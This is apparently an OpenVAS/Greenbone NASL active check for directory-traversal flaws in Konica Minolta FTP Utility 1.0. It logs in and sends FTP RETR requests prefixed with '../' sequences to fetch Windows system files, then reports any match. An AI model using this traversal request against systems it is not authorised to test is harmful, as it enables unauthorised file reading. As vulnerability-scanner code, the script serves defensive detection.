# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:konicaminolta:ftp_utility";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805750");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-09-28 13:43:21 +0530 (Mon, 28 Sep 2015)");
  script_cve_id("CVE-2015-7603", "CVE-2015-7767", "CVE-2015-7768");
  script_name("Konica Minolta FTP Utility 1.0 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("FTP");
  script_dependencies("gb_konica_minolta_ftp_utility_detect.nasl", "logins.nasl");
  script_mandatory_keys("KonicaMinolta/Ftp/Installed");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38260/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38252/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38254/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39215/");

  script_tag(name:"summary", value:"Konica Minolta FTP Utility is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted FTP RETR request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling of file names. It does
  not properly sanitise filenames containing directory traversal sequences that are received from an
  FTP server.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application or execute arbitrary command on the affected application.");

  script_tag(name:"affected", value:"Konica Minolta FTP Utility version 1.0 is known to be affected.
  Other versions might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"ftp"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(!login_details) {
  close(soc);
  exit(0);
}

port2 = ftp_get_pasv_port(socket:soc);
if(!port2) {
  close(soc);
  exit(0);
}

soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
if(!soc2) {
  close(soc);
  exit(0);
}

files = traversal_files("Windows");

foreach pattern(keys(files)) {

  file = files[pattern];
  file = "../../../../../../../../" + file;
  req = string("RETR ", file);
  send(socket:soc, data:string(req, "\r\n"));

  res = ftp_recv_data(socket:soc2);

  if(res && match = egrep(string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE)) {
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message(port:port, data:report);
    close(soc2);
    close(soc);
    exit(0);
  }
}

close(soc);
close(soc2);

exit(99);
